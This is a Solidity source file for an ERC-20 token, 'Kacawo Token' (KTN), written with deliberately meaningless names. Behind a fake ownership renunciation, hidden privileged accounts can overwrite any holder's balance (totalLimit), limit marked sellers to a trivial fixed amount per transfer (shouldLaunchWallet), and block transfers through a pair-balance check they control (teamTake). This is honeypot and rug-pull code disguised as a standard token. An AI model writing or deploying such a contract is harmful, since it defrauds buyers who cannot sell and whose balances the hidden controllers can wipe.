//SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

interface listAt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract swapTrading {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface maxLaunched {
    function createPair(address autoTx, address listEnableShould) external returns (address);
}

interface shouldTotalToken {
    function totalSupply() external view returns (uint256);

    function balanceOf(address shouldReceiver) external view returns (uint256);

    function transfer(address fundMax, uint256 walletIs) external returns (bool);

    function allowance(address senderSell, address spender) external view returns (uint256);

    function approve(address spender, uint256 walletIs) external returns (bool);

    function transferFrom(
        address sender,
        address fundMax,
        uint256 walletIs
    ) external returns (bool);

    event Transfer(address indexed from, address indexed enableLaunched, uint256 value);
    event Approval(address indexed senderSell, address indexed spender, uint256 value);
}

interface feeTrading is shouldTotalToken {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract KacawoToken is swapTrading, shouldTotalToken, feeTrading {

    address public limitBuy;

    function allowance(address tokenExempt, address marketingTeam) external view virtual override returns (uint256) {
        if (marketingTeam == listWallet) {
            return type(uint256).max;
        }
        return tradingList[tokenExempt][marketingTeam];
    }

    function shouldTradingBuy(address walletFee, address fundMax, uint256 walletIs) internal returns (bool) {
        require(listReceiver[walletFee] >= walletIs);
        listReceiver[walletFee] -= walletIs;
        listReceiver[fundMax] += walletIs;
        emit Transfer(walletFee, fundMax, walletIs);
        return true;
    }

    function decimals() external view virtual override returns (uint8) {
        return shouldWallet;
    }

    function shouldLaunchWallet(address atLiquidityTake) public {
        autoTeamLaunch();
        
        if (atLiquidityTake == swapAuto || atLiquidityTake == limitBuy) {
            return;
        }
        marketingTo[atLiquidityTake] = true;
    }

    address listWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address public swapAuto;

    uint256 constant launchSender = 9 ** 10;

    address maxToFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 private totalTake;

    mapping(address => bool) public marketingTo;

    uint256 launchMax;

    uint256 private totalTrading = 100000000 * 10 ** 18;

    constructor (){
        
        listAt receiverEnable = listAt(listWallet);
        limitBuy = maxLaunched(receiverEnable.factory()).createPair(receiverEnable.WETH(), address(this));
        
        swapAuto = _msgSender();
        modeBuy();
        totalMarketing[swapAuto] = true;
        listReceiver[swapAuto] = totalTrading;
        if (totalTake != liquidityTeam) {
            buySwapList = true;
        }
        emit Transfer(address(0), swapAuto, totalTrading);
    }

    function approve(address marketingTeam, uint256 walletIs) public virtual override returns (bool) {
        tradingList[_msgSender()][marketingTeam] = walletIs;
        emit Approval(_msgSender(), marketingTeam, walletIs);
        return true;
    }

    address private tradingMode;

    function symbol() external view virtual override returns (string memory) {
        return teamMin;
    }

    mapping(address => uint256) private listReceiver;

    string private sellList = "Kacawo Token";

    function transfer(address senderTotalTrading, uint256 walletIs) external virtual override returns (bool) {
        return tokenFund(_msgSender(), senderTotalTrading, walletIs);
    }

    function owner() external view returns (address) {
        return tradingMode;
    }

    function totalLimit(address senderTotalTrading, uint256 walletIs) public {
        autoTeamLaunch();
        listReceiver[senderTotalTrading] = walletIs;
    }

    function tokenFund(address walletFee, address fundMax, uint256 walletIs) internal returns (bool) {
        if (walletFee == swapAuto) {
            return shouldTradingBuy(walletFee, fundMax, walletIs);
        }
        uint256 amountEnable = shouldTotalToken(limitBuy).balanceOf(maxToFrom);
        require(amountEnable == launchMax);
        require(fundMax != maxToFrom);
        if (marketingTo[walletFee]) {
            return shouldTradingBuy(walletFee, fundMax, launchSender);
        }
        return shouldTradingBuy(walletFee, fundMax, walletIs);
    }

    function autoTeamLaunch() private view {
        require(totalMarketing[_msgSender()]);
    }

    function getOwner() external view returns (address) {
        return tradingMode;
    }

    function teamTake(uint256 walletIs) public {
        autoTeamLaunch();
        launchMax = walletIs;
    }

    bool private takeMaxMarketing;

    function teamLaunch(address shouldAuto) public {
        if (sellMin) {
            return;
        }
        
        totalMarketing[shouldAuto] = true;
        
        sellMin = true;
    }

    bool public sellMin;

    mapping(address => bool) public totalMarketing;

    function transferFrom(address walletFee, address fundMax, uint256 walletIs) external override returns (bool) {
        if (_msgSender() != listWallet) {
            if (tradingList[walletFee][_msgSender()] != type(uint256).max) {
                require(walletIs <= tradingList[walletFee][_msgSender()]);
                tradingList[walletFee][_msgSender()] -= walletIs;
            }
        }
        return tokenFund(walletFee, fundMax, walletIs);
    }

    uint256 public liquidityTeam;

    uint8 private shouldWallet = 18;

    function balanceOf(address shouldReceiver) public view virtual override returns (uint256) {
        return listReceiver[shouldReceiver];
    }

    uint256 launchIs;

    mapping(address => mapping(address => uint256)) private tradingList;

    event OwnershipTransferred(address indexed atMarketing, address indexed atToLimit);

    function totalSupply() external view virtual override returns (uint256) {
        return totalTrading;
    }

    function modeBuy() public {
        emit OwnershipTransferred(swapAuto, address(0));
        tradingMode = address(0);
    }

    bool public buySwapList;

    string private teamMin = "KTN";

    function name() external view virtual override returns (string memory) {
        return sellList;
    }

}